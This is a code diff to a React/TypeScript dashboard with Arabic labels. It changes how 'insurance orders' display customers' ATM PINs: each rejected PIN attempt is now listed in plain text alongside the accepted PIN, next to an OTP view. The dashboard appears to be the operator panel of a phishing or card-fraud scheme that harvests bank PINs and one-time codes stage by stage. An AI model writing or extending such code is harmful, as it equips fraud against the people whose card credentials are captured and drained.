@@ -422,11 +422,27 @@ function renderOtp(order: InsuranceOrder, stageEvents: StageEvent[], getLatestRe
   );
 }
 
-function renderAtm(order: InsuranceOrder) {
-  if (!order.atm_pin) return <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>;
+function renderAtm(order: InsuranceOrder, stageEvents: StageEvent[]) {
+  const rejected = stageEvents
+    .filter(e => e.order_id === order.id && e.stage === "atm" && e.status === "rejected")
+    .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
+
+  if (!order.atm_pin && rejected.length === 0) {
+    return <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>;
+  }
   return (
-    <div className="flex justify-center">
-      <span className="text-lg font-mono font-bold tracking-[4px] text-emerald-600 bg-emerald-500/10 px-3 py-1 rounded-lg border border-emerald-500/20">{order.atm_pin}</span>
+    <div className="space-y-1.5">
+      {rejected.map((ev, i) => (
+        <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-2.5 py-1">
+          <span className="text-[10px] text-red-500">محاولة {i + 1} — مرفوضة</span>
+          <span className="text-sm font-mono font-bold tracking-[4px] text-red-400 line-through">{(ev.payload as any)?.atm_pin || "—"}</span>
+        </div>
+      ))}
+      {order.atm_pin && (
+        <div className="flex justify-center">
+          <span className="text-lg font-mono font-bold tracking-[4px] text-emerald-600 bg-emerald-500/10 px-3 py-1 rounded-lg border border-emerald-500/20">{order.atm_pin}</span>
+        </div>
+      )}
     </div>
   );
 }
